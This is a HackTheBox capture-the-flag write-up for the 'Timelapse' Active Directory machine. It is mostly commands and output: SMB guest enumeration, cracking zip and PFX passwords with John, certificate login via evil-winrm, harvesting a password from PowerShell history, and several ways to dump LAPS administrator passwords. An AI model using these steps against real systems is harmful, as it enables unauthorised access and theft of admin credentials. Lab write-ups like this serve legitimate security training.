---
title: Timelapse [Easy]
date: 2025-08-17
categories: [HackTheBox, OSEP]
tags: AD Windows
img_path: /assets/Images/HTB_Timelapse/logo.png
image:
  path: /assets/Images/HTB_Timelapse/logo.png
---

# Timelapse [Easy] [OSEP]

![Screenshot 2025-08-17 at 5.17.10 PM.png](/assets/Images/HTB_Timelapse/Screenshot_2025-08-17_at_5.17.10_PM.png)

## 🤨 Enumeration

```bash
nmap -T4 -vv -sC -sV -oN nmap/intial 10.129.185.51
```

```bash
# Nmap 7.95 scan initiated Sun Aug 17 21:15:37 2025 as: /usr/lib/nmap/nmap -T4 -vv -sC -sV -oN nmap/intial 10.129.185.51
Nmap scan report for dc01.timelapse.htb (10.129.185.51)
Host is up, received echo-reply ttl 127 (0.16s latency).
Scanned at 2025-08-17 21:15:38 IST for 122s
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-17 18:17:02Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
| SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| -----BEGIN CERTIFICATE-----
| MIID...b8E=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2025-08-17T18:18:37+00:00; +2h31m03s from scanner time.
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28929/tcp): CLEAN (Timeout)
|   Check 2 (port 30306/tcp): CLEAN (Timeout)
|   Check 3 (port 61672/udp): CLEAN (Timeout)
|   Check 4 (port 16274/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-17T18:17:56
|_  start_date: N/A
|_clock-skew: mean: 2h31m00s, deviation: 3s, median: 2h30m57s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 

```

Guest Login is Allowed is allowed

```bash
┌──(root㉿pain)-[/htb/timelapse]
└─# nxc smb dc01.timelapse.htb -u 'a' -p ''
SMB         10.129.185.51   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.185.51   445    DC01             [+] timelapse.htb\a: (Guest)
```

We can see there is a `Shares` share which is interesting

```bash
nxc smb dc01.timelapse.htb -u 'a' -p '' --shares
```

![image.png](/assets/Images//HTB_Timelapse/image.png)

Using smbclientng to login

```bash
smbclientng -u 'a' -p '' --host dc01.timelapse.htb
```

![image.png](/assets/Images//HTB_Timelapse/image%201.png)

Download the `winrm_backup.zip` 

```bash
unzip winrm_backup.zip
```

It has a Password for unzip 

So we can extract the password hash via john

```bash
zip2john winrm_backup.zip > hash_backup
```

Crack it via John

```bash
┌──(root㉿pain)-[/htb/timelapse/winrm_backup]
└─# john hash_backup 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)  
1g 0:00:00:00 DONE (2025-08-18 00:00) 4.545g/s 15788Kp/s 15788Kc/s 15788KC/s tabatha916..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

After extracting the zip we got a auth pfx which we can research about it 

Got `legacyy_dev_auth.pfx`

## 🔱 Initial Access

There is a PFX file inside it 

### Extracting Certificate from pfx for Auth

pfx also contain passphase 

using pfx2john to extract the hash 

```bash
pfx2john legacyy_dev_auth.pfx > pfx_hash
```

Cracking it through John

```bash
┌──(root㉿pain)-[/htb/timelapse/winrm_backup]
└─# john pfx_hash   
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 ASIMD 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**thuglegacy**       **(legacyy_dev_auth.pfx)**     
1g 0:00:01:16 DONE (2025-08-18 00:10) 0.01302g/s 42144p/s 42144c/s 42144C/s thyriana..thomasfern
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

There is a documentation of openssl how we can analyse this `pfx` file 

[openssl-pkcs12 - OpenSSL Documentation](https://docs.openssl.org/3.5/man1/openssl-pkcs12/#options)

![image.png](/assets/Images//HTB_Timelapse/image%202.png)

Getting info about this `pfx`

```bash
┌──(root㉿pain)-[/htb/timelapse]
└─# openssl pkcs12 -in winrm_backup/legacyy_dev_auth.pfx -info
Enter Import Password:**thuglegacy**
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
Enter PEM pass phrase:**thuglegacy**
Verifying - Enter PEM pass phrase:**thuglegacy**
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQEfIYMDWstGxobMyn
TnicTAICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEElUvOknlaYtzU6L
CGjBhnsEggTQsPuwPXbfbZZQBkPJPJZSN+3LdPpE0liZ/1Oc1Rg65BJUWV8Y4JCn
Xmtm/Mkr6Mtw5gus8ewTpYJ6aTLq+jNzHNYZEmw693wfR55oGXODAQx1KWm79QkA
2ohA/XI508/LB0vPc8lp1NQTSBYcZAbY6Rz6U+SVEyqGfxOn0WuRUdsL+EAoBXBn
qGbCvSmcjdBKRbvi4vTFg5hSW4SY68bnvzncY9/jCSoz/ZMPgB33EdA1wZ2jUvw+
sppsj/nv90R6t8nUL6KJDu9yUIixqvOG14SxSyW4b8FOvMHmJ9zFx37OMPZWW1kI
sv/dXgwJ1eyObsu2z6f4wuaIoKG6+dcEjBuWtwL1dEJlzOHuuT9KGosxP59yGU6f
YBQumQx4QgLVqk8/KrRzIWtM63LLQP/nLPAaWzM2B95va9GjzAw2fVH/nRWUq9VW
csO90LMylQs2InRYDCCmTAvuCfGBahfLSg0BUDzaVzYRVsbQtvHDEBCkMXtZDA6L
PVm/8Zfx+CM3yH+S2VOHp/hREbc4lQo0fMdfpKVXxZNw9lly3rD2H+sgMXBVx6vZ
GpV9ann8aLveaK2SVppVmuTBbUbDTrBKUSWuuGWv5qS7A+D3Nuh03hbFqFnI4tLm
r4LsUjjgCuhyRcw/jqlJK5aDla0noAJs4JTZPDK/RA1xuJV43DK8aOQUKqX89NRp
23mibRAaTeB2+lsMsAdC2vXkMAn614sYnj4nuulrGvhAswOodg7tMIfWGqF6qb7v
sgqr8IXGVQeYoPWHglQVauTqP2+4NOdGHVl1uLAzYdQPnAKimR+QAFuV86CmX/KZ
kg0588MRMtD4kIC2JsyRK1SjVSHt7F8IxA3j/SFaNamWBSvaTZfSrwV6Ffs7+nTf
elot/J9c7mgs2Pj1YuMuDqRtV/gMsd/7yLCCC9nTQVjVqk0rdo6ZbyvJV73Ek8mc
RHSpJOabsfOMByefWkzMC6vlqWY8B5/n3j5UKjUs/51ZbjPlkpDER5f4wixheAEU
slUXmP53jjMw3uJsMCj3PHpVS4EzAdtlE87DKM1WniYQVFzb+0kCfme+hDEUZ+TJ
FICHbDvpvtxlXCmXmykDvONCCUsy36ERUWyk8h+p4AcjGaeD8kKfwepEIDX+sYPc
Y0GYld8nO4PkqAQRiLAQYZerY7we2vcxBIwR9ApqJyTBLsyUH1wmOjwSBB5sWmr9
yvgVOQ5rsTW8VVcQ/USOmUsGQEu+PZAi+SiKvqCvtThSpCaBfSg67UZvetLuZ0Ty
OaHcxaQxXl+APhRgm8UuNTur99BHohsImdql+PS8Lhjcy+nwizFpt5GyclvqsB0t
F1ou04d58g2/sAjV2uRsH4wTNZEJvyLwWlJOn3iafe+vphYx6Ikqi8ZZ3lLonnpz
enxBCcFa/qCulbG43C5PlZtB3q4RrL8p3N0iFIzAlH3YhtxpxqcKn03P253FbnbT
PqfTWX3kvKKLGA7nfwBihveSLZ4V1YZ2uEVWwH18162+Y3iWUZu90CCD14DBtAUU
COeV15dFhb6rdJRL/qViLwbLZ4VpnlzeximXB9bgc1C6qkF48CSh9L6bRHvOLwyS
jvqaBXVr4qAmqxeqo5BXajiK073KzJQooC040NQNGDH41SX1hwqAsh8=
-----END ENCRYPTED PRIVATE KEY-----
PKCS7 Data
Certificate bag
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN=Legacyy
issuer=CN=Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----

```

To Extract Private Certificate `-nocerts` & `-nodes`

Run the following command to extract the private key

```bash
openssl pkcs12 -in winrm_backup/legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

Run the following command to extract the certificate

```bash
openssl pkcs12 -in winrm_backup/legacyy_dev_auth.pfx -nokeys -out key.cert
```

Now we have both certificate and the private key

```bash
┌──(root㉿pain)-[/htb/timelapse]
└─# ls key.cert key.pem 
       key.cert        key.pem 
```

Good article 

[A Detailed Guide on Evil-Winrm](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)

![image.png](/assets/Images//HTB_Timelapse/image%203.png)

Login using the certificate

```bash
evil-winrm -i $IP -S  -c key.cert -k key.pem
```

Run `Winpeas`

```bash
.\winpeas.exe
```

Got a Powershell ConsoleHost_history file

![image.png](/assets/Images//HTB_Timelapse/image%204.png)

It contain password of `svc_deploy` user 

```bash
***Evil-WinRM*** **PS** C:\Users\legacyy> **type "C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"**
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString '**E3R$Q62^12p7PLlC%KWaxuaV**' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('**svc_deploy**', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```

Credentials

```bash
**svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV**
```

Its Vaild

```bash
┌──(root㉿pain)-[/htb/timelapse/winrm_backup]
└─# nxc smb dc01.timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' 
SMB         10.129.185.51   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.185.51   445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
```

## 💀 Priv Esc

## LAPS

`LAPS (Local Administrator Password Solution)` in Active Directory is a security feature that automatically manages and rotates the local administrator password on domain-joined machines. Instead of having the same local admin password across all systems (which attackers can easily abuse if one machine is compromised), LAPS ensures each machine gets a unique, randomly generated password that is securely stored in Active Directory. Authorized administrators can retrieve it when needed, and it changes automatically on a set schedule. This greatly reduces the risk of lateral movement, prevents password reuse attacks, and strengthens overall security hygiene, making it an essential control for any organization.

![image.png](/assets/Images//HTB_Timelapse/image%205.png)

I listed all the methods which you can use to Retrive LAPS Password !

Using netexec to retrive the password 

```bash
nxc ldap $IP -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV' --module laps
```

or

```bash
git clone https://github.com/p0dalirius/pyLAPS
cd pyLAPS
chmod 777 pyLAPS.py
 ./pyLAPS.py --action get -d "10.129.185.51" -u "svc_deploy" -p "E3R$Q62^12p7PLlC%KWaxuaV"
```

or

```bash
git clone https://github.com/n00py/LAPSDumper
cd LAPSDumper
chmod 777 laps.py
python laps.py -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d 'timelapse.htb'
```

or

```bash
bloodyAD --host "10.129.185.51" -d "timelapse.htb" -u "svc_deploy" -p "E3R$Q62^12p7PLlC%KWaxuaV" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

or

```bash
ldapsearch -x -H ldap://10.129.185.51 -D "svc_deploy@timelapse.htb" -w "E3R$Q62^12p7PLlC%KWaxuaV" -b "dc=ignite,dc=local" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmP
```

or

```bash
use auxiliary/gather/ldap_query
set rhosts 10.129.185.51
set username svc_deploy
set password E3R$Q62^12p7PLlC%KWaxuaVc
set domain timelapse.htb
set action ENUM_LAPS_PASSWORDS
run
```

or

```bash
ldap_shell timelapse.htb/svc_deploy:E3R$Q62^12p7PLlC%KWaxuaVc -dc-ip 10.129.185.51
#  get_laps_gmsa 
```

or

```bash
Powershell –ep bypass
Import-Module .\Get-LAPSPasswords.ps1
GET-LAPSPasswords -DomainControler 10.129.185.51 -Credentials IGNITE\svc_deploy | Format-Table -Autosize
```

or

```bash
impacket-GetLAPSPassword timelapse.htb/svc_deploy:'E3R$Q62^12p7PLlC%KWaxuaV' -dc-ip $IP
```

![image.png](/assets/Images//HTB_Timelapse/image%206.png)

```bash
evil-winrm -i $IP -u 'Administrator' -p '<LAPSPASSWORD>'
```

---

### `Author : PaiN`